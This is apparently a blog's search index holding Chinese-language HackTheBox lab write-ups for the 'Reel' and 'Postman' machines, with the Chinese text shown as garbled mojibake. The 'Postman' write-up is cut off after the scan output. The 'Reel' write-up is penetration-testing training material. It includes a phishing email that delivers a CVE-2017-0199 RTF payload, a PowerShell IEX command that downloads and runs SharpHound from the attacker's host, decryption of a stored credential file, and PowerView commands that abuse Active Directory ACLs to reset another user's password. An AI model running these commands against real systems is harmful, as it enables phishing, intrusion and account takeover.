<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Reel</title>
    <url>/2021/12/24/Reel/</url>
    <content><![CDATA[<h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Host discovery disabled (-Pn). All addresses will be marked <span class="string">&#x27;up&#x27;</span> and scan <span class="built_in">times</span> will be slower.</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-14 05:18 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.77</span><br><span class="line">Host is up (0.30s latency).</span><br><span class="line">Not shown: 9997 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     Microsoft ftpd</span><br><span class="line">| ftp-syst: </span><br><span class="line">|_  SYST: Windows_NT</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA)</span><br><span class="line">|   256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA)</span><br><span class="line">|_  256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (ED25519)</span><br><span class="line">25/tcp open  smtp?</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   Hello: </span><br><span class="line">|     220 Mail Service ready</span><br><span class="line">|     EHLO Invalid domain address.</span><br><span class="line">|   Help: </span><br><span class="line">|     220 Mail Service ready</span><br><span class="line">|     DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY</span><br><span class="line">|   NULL: </span><br><span class="line">|_    220 Mail Service ready</span><br><span class="line">| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP, </span><br><span class="line">|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY </span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port25-TCP:V=7.91%I=7%D=11/14%Time=6190E2F5%P=x86_64-pc-linux-gnu%r(NUL</span><br><span class="line">SF:L,18,<span class="string">&quot;220\x20Mail\x20Service\x20ready\r\n&quot;</span>)%r(Hello,3A,<span class="string">&quot;220\x20Mail\x20</span></span><br><span class="line"><span class="string">SF:Service\x20ready\r\n501\x20EHLO\x20Invalid\x20domain\x20address\.\r\n&quot;</span>)</span><br><span class="line">SF:%r(Help,54,<span class="string">&quot;220\x20Mail\x20Service\x20ready\r\n211\x20DATA\x20HELO\x20E</span></span><br><span class="line"><span class="string">SF:HLO\x20MAIL\x20NOOP\x20QUIT\x20RCPT\x20RSET\x20SAML\x20TURN\x20VRFY\r\n</span></span><br><span class="line"><span class="string">SF:&quot;</span>);</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">OS fingerprint not ideal because: Missing a closed TCP port so results incomplete</span><br><span class="line">No OS matches <span class="keyword">for</span> host</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 22/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   301.22 ms 10.10.14.1</span><br><span class="line">2   301.21 ms 10.10.10.77</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 185.69 seconds</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>å‘ç°å¼€æ”¾äº†21ç«¯å£ï¼Œå¯ä»¥åŒ¿åç™»å½•ï¼Œå¹¶ä¸”åœ¨documentsç›®å½•ä¸‹å‘ç°äº†ä¸¤ä¸ªdocxæ–‡ä»¶ï¼Œæˆ‘ä»¬å°†å…¶ä¸‹è½½ä¸‹æ¥å¹¶ä½¿ç”¨exiftoolæŸ¥çœ‹å†…å®¹å¦‚ä¸‹<img src="https://img-blog.csdnimg.cn/15c476e67c4941c6b76d60c03fdede70.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>readme.txtæ–‡ä»¶å‘Šè¯‰æˆ‘ä»¬æœ‰äººæ­£åœ¨ç­‰å¾… .rtf æ–‡ä»¶å¹¶å°†æ‰“å¼€å®ƒä»¬è¿›è¡Œå®¡æŸ¥ï¼Œå› ä¸ºè€ƒè™‘åˆ°æœºå™¨ä¸Šæ­£åœ¨è¿è¡Œ SMTP æœåŠ¡ï¼Œè¿™å¯èƒ½æ˜¯æˆ‘ä»¬çš„ç›®æ ‡ï¼Œå…·æœ‰ç½‘ç»œé’“é±¼æ”»å‡»ã€‚<br><img src="https://img-blog.csdnimg.cn/c858f787033a4c5b8a8cbbe73d598b86.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>æŸ¥é˜…å®˜æ–¹æ–‡æ¡£å‘ç°ï¼ŒAppLockerå¯ä»¥é˜»æ­¢å¯æ‰§è¡Œæ–‡ä»¶å’Œè„šæœ¬</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">AppLocker procedure to be documented - <span class="built_in">hash</span> rules <span class="keyword">for</span> exe, msi and scripts  (ps1,vbs,cmd,bat,js) are <span class="keyword">in</span> effect.</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å‘ç°Windows Event Forwarding.docxè¿™ä¸ªæ–‡ä»¶ä¸­å­˜åœ¨ä¸€ä¸ªé‚®ç®±åœ°å€<code>nico@megabank.com</code><br><img src="https://img-blog.csdnimg.cn/14102687e160477884fd2f3e6c8910a6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<!--more-->

<p>æ ¹æ®åˆšåˆšreadme.txtçš„æ–‡ä»¶å†…å®¹ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•å°†rtfæ–‡ä»¶å‘é€åˆ°è¿™ä¸ªåœ°å€ä¸Šï¼Œæˆ‘ä»¬ä»applicationå­—æ®µä¸­å‘ç°æˆ‘ä»¬å¯ä»¥ä½¿ç”¨wordæ–‡æ¡£çš„æ–¹å¼è¿›è¡Œåˆ›å»ºã€‚å¹¶ä¸”æˆ‘ä»¬åœ¨ç½‘ä¸Šæœç´¢çœ‹åˆ°ï¼Œå…³äºrtfæ–‡ä»¶æ¼æ´åˆ©ç”¨æ˜¯å·²ç»æŠ«éœ²çš„æ¼æ´ç¼–å·<code>CVE-2017-0199</code>ï¼Œæ­¤æ¼æ´å…è®¸åˆ›å»ºæ¶æ„ rtf æ–‡æ¡£ï¼Œåœ¨æ‰“å¼€æ–‡æ¡£æ—¶å¯åŠ¨ HTAï¼ˆè¶…æ–‡æœ¬åº”ç”¨ç¨‹åº)æœ‰æ•ˆè´Ÿè½½ï¼ŒGithub ä¸Šæœ‰ä¸€ä¸ªç”¨äºåˆ¶ä½œåˆ©ç”¨æ­¤æ¼æ´çš„æ¶æ„æ–‡æ¡£çš„ Python å·¥å…·åŒ…ï¼Œä½†ä¹Ÿæœ‰ä¸€ä¸ª Metasploit æ¨¡å—ï¼Œæˆ‘ä»ç„¶å°†ä½¿ç”¨ Python è„šæœ¬ã€‚</p>
<h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>é¦–å…ˆæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªhtaçš„è½½è·<br><img src="https://img-blog.csdnimg.cn/b6c156c3e5e84eebb3b7207a29673574.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æœ¬åœ°å¼€å¯httpæœåŠ¡å™¨<br><img src="https://img-blog.csdnimg.cn/ebf7fdbfa46043bb84f2a0e1c331c6c7.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>ç„¶ååˆ©ç”¨è¿™ä¸ªhtaè„šæœ¬ï¼Œåˆ›å»ºrtfæ–‡ä»¶<br><img src="https://img-blog.csdnimg.cn/bf21d9b792054d399fe94052c21c3129.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æœ€åå‘é€é’“é±¼é‚®ä»¶è¿›è¡Œè·å–æƒé™</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sendEmail -f 0xdf@megabank.com -t nico@megabank.com -u Test -m <span class="string">&quot;Hey, take a look at this new format procedure&quot;</span> -a document.rtf -s 10.10.10.77 -v</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/f64aa5ef2a984a4e92fd8dfed197da16.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å‘é€é’“é±¼é‚®ä»¶å¹¶å¼€å¯ç›‘å¬ï¼Œæˆ‘ä»¬å¾—åˆ°äº†nicoè´¦æˆ·çš„ç”¨æˆ·æƒé™<br><img src="https://img-blog.csdnimg.cn/6965f266fe7341beb4fd71506ff9335b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="ææƒåˆ°TOMæƒé™"><a href="#ææƒåˆ°TOMæƒé™" class="headerlink" title="ææƒåˆ°TOMæƒé™"></a>ææƒåˆ°TOMæƒé™</h2><p>æˆ‘ä»¬ä»Nicoè´¦æˆ·çš„æ¡Œé¢ä¸Šçœ‹åˆ°ä¸€ä¸ªcred.xmlæ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹åŒ…å«äº†passwordå­—æ®µå†…å®¹<br><img src="https://img-blog.csdnimg.cn/b971324dcaa14613a8d91aa6b4997923.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>PowerShell æœ‰ä¸€ä¸ªç§°ä¸º PSCredential çš„å¯¹è±¡ï¼Œå®ƒæä¾›äº†ä¸€ç§å­˜å‚¨ç”¨æˆ·åã€å¯†ç å’Œå‡­æ®çš„æ–¹æ³•ã€‚è¿˜æœ‰ä¸¤ä¸ªå‡½æ•°Import-CliXmlå’ŒExport-CliXmlï¼Œç”¨äºå°†è¿™äº›å‡­æ®ä¿å­˜åˆ°æ–‡ä»¶ä¸­å¹¶ä»æ–‡ä»¶ä¸­æ¢å¤å®ƒä»¬ã€‚è¯¥æ–‡ä»¶æ˜¯Export-CliXmlï¼Œæˆ‘ä»¬å‘ç°Tomçš„å¯†ç æ˜¯<code>1ts-mag1c!!!</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\nico\Desktop&gt;powershell -c <span class="string">&quot;<span class="variable">$cred</span>=Import-CliXml -Path cred.xml;<span class="variable">$cred</span>.GetNetworkCredential() | Format-List *&quot;</span></span><br><span class="line">powershell -c <span class="string">&quot;<span class="variable">$cred</span>=Import-CliXml -Path cred.xml;<span class="variable">$cred</span>.GetNetworkCredential() | Format-List *&quot;</span></span><br><span class="line"></span><br><span class="line">UserName       : Tom</span><br><span class="line">Password       : 1ts-mag1c!!!</span><br><span class="line">SecurePassword : System.Security.SecureString</span><br><span class="line">Domain         : HTB</span><br></pre></td></tr></table></figure>

<p>å› ä¸ºç›®æ ‡ä¸»æœºå¼€æ”¾äº†22ç«¯å£ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥è¿æ¥ä¸»æœºçš„è¿œç¨‹æœåŠ¡<br><img src="https://img-blog.csdnimg.cn/c0ef87585054476281e5aa1595fa284e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬åœ¨tomçš„æ¡Œé¢çš„AD auditæ–‡ä»¶å¤¹ä¸‹å‘ç°äº†ä¸€ä¸ªæœ‰è¶£çš„æ–‡ä»¶å†…å®¹ï¼Œè¿˜æœ‰ä¸€ä¸ªBloodHoundæ–‡ä»¶å¤¹<br><img src="https://img-blog.csdnimg.cn/67be2e3fd4494a14bc46cd3a6af8eb45.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/e9b9cfa8736d42788e6f32b6d3b628fa.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç»è¿‡æŸ¥é˜…æ–‡ç« å‘ç°ï¼Œbloodhoundé€šè¿‡csvæ–‡ä»¶å½¢å¼ä¿å­˜æ–‡ä»¶çš„ï¼Œéƒ½æ˜¯2.0ç‰ˆæœ¬ä»¥å‰çš„äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç°åœ¨æœ‰ä¸¤ä¸ªé€‰æ‹©ï¼Œä¸€ä¸ªæ˜¯åœ¨ç›®æ ‡ä¸»æœºä¸Šå®‰è£…æ—§ç‰ˆæœ¬çš„bloodhoundï¼ŒäºŒæ˜¯å°†æ”¶é›†åˆ°çš„æ•°æ®ä¸Šä¼ åˆ°æˆ‘ä»¬æ”»å‡»æœºä¸Šè¿›è¡Œåˆ†æï¼Œæˆ‘é€‰æ‹©çš„æ˜¯ç¬¬äºŒç§æ–¹å¼ã€‚</p>
<p>é¦–å…ˆæˆ‘ä»¬å°†ç›®æ ‡çš„è„šæœ¬åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œç»•è¿‡powershellçš„ç­–ç•¥é™åˆ¶ã€‚æ”¶é›†åˆ°çš„ä¿¡æ¯ä¿å­˜åœ¨å½“å‰ç›®å½•çš„ä¸€ä¸ªå‹ç¼©åŒ…ä¸­ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">IEX(New-Object Net.WebClient).downloadString(<span class="string">&#x27;http://10.10.14.7/sharphound/SharpHound.ps1&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/44243984d10a4293a08aebd5b9748298.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä¸ºäº†ä¼ è¾“æ–¹ä¾¿ï¼Œæˆ‘ä»¬åœ¨æœ¬åœ°å¼€å¯smbæœåŠ¡<br><img src="https://img-blog.csdnimg.cn/65746cbe84ba4b048fb124b74a55a741.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬åœ¨æ”»å‡»æœºä¸Šå¼€å¯bloodhoundåï¼Œå°†å‹ç¼©åŒ…æ‹–è¿›å»è¿›è¡Œåˆ†æï¼Œç‚¹å‡»<code>Shortest Paths to High Value Targets</code>ã€‚ä¸ºäº†æ–¹ä¾¿ç­›é€‰ï¼Œæˆ‘ä»¬é€‰æ‹©tomåˆ°adminçš„ææƒè·¯å¾„å’Œnicoåˆ°adminçš„è·¯å¾„è¿›è¡Œåˆ†æ<br><img src="https://img-blog.csdnimg.cn/29bd464348754983b4412b33ca42a996.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/399172cccb7243948e1b64abf136697b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘çŸ¥é“ claire å¯¹ Backup_Admins ç»„å…·æœ‰ WriteDacl æƒé™ã€‚æˆ‘å¯ä»¥ç”¨å®ƒæŠŠå¥¹åŠ åˆ°ç¾¤é‡Œï¼Œä½†æ˜¯äº‹å…ˆæˆ‘ä»¬å…ˆå¾—è¿æ¥åˆ°claireè¿™ä¸ªç”¨æˆ·ä¸Šã€‚</p>
<h2 id="ææƒåˆ°Administrator"><a href="#ææƒåˆ°Administrator" class="headerlink" title="ææƒåˆ°Administrator"></a>ææƒåˆ°Administrator</h2><p>é¦–å…ˆï¼Œæˆ‘ä»¬å°†è‡ªå·±è®¾ç½®ä¸º claire å¸æˆ·çš„æ‰€æœ‰è€…ï¼Œä»¥ä¾¿æˆ‘ä»¬å¯ä»¥æ›´æ”¹å¥¹çš„å±æ€§ï¼›ç„¶åæˆ‘ä»¬æ›´æ”¹ claire AD å¯¹è±¡çš„è®¿é—®æ§åˆ¶åˆ—è¡¨ (ACL) ä»¥æˆäºˆæˆ‘ä»¬è‡ªå·± (Tom) é‡ç½® claire å¯†ç çš„æƒé™ï¼›ç„¶åæˆ‘ä»¬ä¸ºè¯¥å¸æˆ·é€‰æ‹©ä¸€ä¸ªæ–°å¯†ç å¹¶å°†å…¶è½¬æ¢ä¸º SecureString æ ¼å¼ï¼Œè¿™å°±æ˜¯ PowerShell ç”¨äºå¯†ç çš„æ ¼å¼ï¼›æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æˆ‘ä»¬é€‰æ‹©çš„ä¸€ä¸ªæ›´æ”¹ claire çš„å¯†ç ï¼›ä¸ºäº†å°†ç”¨æˆ·æ·»åŠ åˆ°ç»„ï¼Œæˆ‘ä»¬å¿…é¡»æä¾›æœ‰æ•ˆçš„ç”¨æˆ·å‡­æ®ï¼Œå› æ­¤æˆ‘ä»¬å£°æ˜ä¸€ä¸ª PSCredential å¯¹è±¡æ¥åŒ…å« claire çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œå› ä¸ºå¥¹æ˜¯å¯¹ Backup_Admins ç»„å…·æœ‰å†™è®¿é—®æƒé™çš„äººï¼›æœ€åæˆ‘ä»¬ä½¿ç”¨å®ƒæ¥å°†è‡ªå·±æ·»åŠ åˆ° Backup_Admins ç»„</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PS C:\Users\tom\Desktop\AD Audit\BloodHound&gt; import-module .\PowerView.ps1</span><br><span class="line">PS C:\Users\tom\Desktop\AD Audit\BloodHound&gt;  Set-DomainObjectOwner -Identity claire -OwnerIdentity tom                         </span><br><span class="line">PS C:\Users\tom\Desktop\AD Audit\BloodHound&gt; Add-ObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword  </span><br><span class="line">PS C:\Users\tom\Desktop\AD Audit\BloodHound&gt; <span class="variable">$password</span>= ConvertTo-SecureString <span class="string">&#x27;Password_123!&#x27;</span> -AsPlainText -Force              </span><br><span class="line">PS C:\Users\tom\Desktop\AD Audit\BloodHound&gt; Set-DomainUserPassword -Identity claire -AccountPassword <span class="variable">$password</span>                 </span><br><span class="line">PS C:\Users\tom\Desktop\AD Audit\BloodHound&gt; <span class="variable">$creds</span> = New-Object System.Management.Automation.PSCredential(<span class="string">&#x27;HTB\claire&#x27;</span>,<span class="variable">$passwor</span></span><br><span class="line">d)                                                                                                                              </span><br><span class="line">PS C:\Users\tom\Desktop\AD Audit\BloodHound&gt; Add-DomainGroupMember -Identity <span class="string">&#x27;Backup_Admins&#x27;</span> -Members <span class="string">&#x27;claire&#x27;</span> -Credential <span class="variable">$cred</span></span><br><span class="line">s</span><br></pre></td></tr></table></figure>

<p>whoami /allæŸ¥çœ‹åˆ°æˆ‘ä»¬å·²ç»å¤„äºbackup_adminsç»„ä¸­äº†<br><img src="https://img-blog.csdnimg.cn/9ff1c27957d54fe3b71bfa62126f58b1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä½†æ˜¯æˆ‘ä»¬è¿˜æ˜¯æ— æ³•æŸ¥çœ‹root.txtçš„å†…å®¹ï¼Œæˆ‘ä»¬å´å¯ä»¥æŸ¥çœ‹<code>Backup Scripts</code>çš„å†…å®¹<br><img src="https://img-blog.csdnimg.cn/b4491a3626c84023b3f122732aa44800.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä½†æ˜¯æˆ‘ä»¬åœ¨<code>BackupScript.ps1</code>ä¸­æ‰¾åˆ°ç®¡ç†å‘˜çš„å¯†ç <br><img src="https://img-blog.csdnimg.cn/3285fc7c314a4f98840bb0bc74f27320.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç›´æ¥ç™»å½•ç®¡ç†å‘˜è´¦å·<br><img src="https://img-blog.csdnimg.cn/f96c6ddacbff4775947400c9dfd03743.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
]]></content>
      <categories>
        <category>é‚®ç®±é’“é±¼</category>
      </categories>
      <tags>
        <tag>HackThebox</tag>
      </tags>
  </entry>
  <entry>
    <title>Postman(Redisæœªæˆæƒè®¿é—®)</title>
    <url>/2021/12/24/Postman/</url>
    <content><![CDATA[<h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>å‘ç°ç›®æ ‡å¼€æ”¾äº†22ã€80ã€6379ç­‰å¸¸è§ç«¯å£</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rootğŸ’€kali)-[~/Desktop/Scan-Scripts]</span><br><span class="line">â””â”€<span class="comment"># ./nmap.sh 10.10.10.160</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-30 07:32 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.160</span><br><span class="line">Host is up (0.30s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)</span><br><span class="line">|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)</span><br><span class="line">|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: The Cyber Geek<span class="string">&#x27;s Personal Website</span></span><br><span class="line"><span class="string">6379/tcp  open  redis   Redis key-value store 4.0.9</span></span><br><span class="line"><span class="string">10000/tcp open  http    MiniServ 1.910 (Webmin httpd)</span></span><br><span class="line"><span class="string">|_http-title: Site doesn&#x27;</span>t have a title (text/html; Charset=iso-8859-1).</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 42.85 seconds</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>æˆ‘ä»¬è®¿é—®ä¸€ä¸‹webæœåŠ¡ï¼Œå‘ç°åªæ˜¯ä¸€ä¸ªæ™®é€šçš„webé¡µé¢è€Œå·²<img src="https://img-blog.csdnimg.cn/31925c3c4c634d4c8dfa4491466b77e0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬æ¨¡ç³Šä¸€ä¸‹ç½‘ç«™è·¯å¾„</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/Scan-Scripts]</span><br><span class="line">â””â”€<span class="comment"># dirsearch -u &quot;http://10.10.10.160&quot; -e * -x404,403,500</span></span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.1</span><br><span class="line"> (_||| _) (/_(_|| (_| )                                                                                                                        </span><br><span class="line">                                                                                                                                               </span><br><span class="line">Extensions: nmap.sh | HTTP method: GET | Threads: 30 | Wordlist size: 8979</span><br><span class="line"></span><br><span class="line">Output File: /root/.dirsearch/reports/10.10.10.160/_21-11-30_07-47-35.txt</span><br><span class="line"></span><br><span class="line">Error Log: /root/.dirsearch/logs/errors-21-11-30_07-47-35.log</span><br><span class="line"></span><br><span class="line">Target: http://10.10.10.160/</span><br><span class="line">                                                                                                                                               </span><br><span class="line">[07:47:35] Starting: </span><br><span class="line">[07:48:35] 301 -  310B  - /css  -&gt;  http://10.10.10.160/css/                                                                             </span><br><span class="line">[07:48:44] 301 -  312B  - /fonts  -&gt;  http://10.10.10.160/fonts/                                                             </span><br><span class="line">[07:48:48] 301 -  313B  - /images  -&gt;  http://10.10.10.160/images/                        </span><br><span class="line">[07:48:48] 200 -    2KB - /images/</span><br><span class="line">[07:48:50] 200 -    4KB - /index.html                                                                                                 </span><br><span class="line">[07:48:51] 200 -    3KB - /js/                                                                                                              </span><br><span class="line">[07:48:52] 301 -  309B  - /js  -&gt;  http://10.10.10.160/js/                   </span><br><span class="line">[07:49:25] 301 -  313B  - /upload  -&gt;  http://10.10.10.160/upload/                                                                       </span><br><span class="line">[07:49:27] 200 -    8KB - /upload/                                                                          </span><br><span class="line">                                                                                                                       </span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure>

<!--more-->

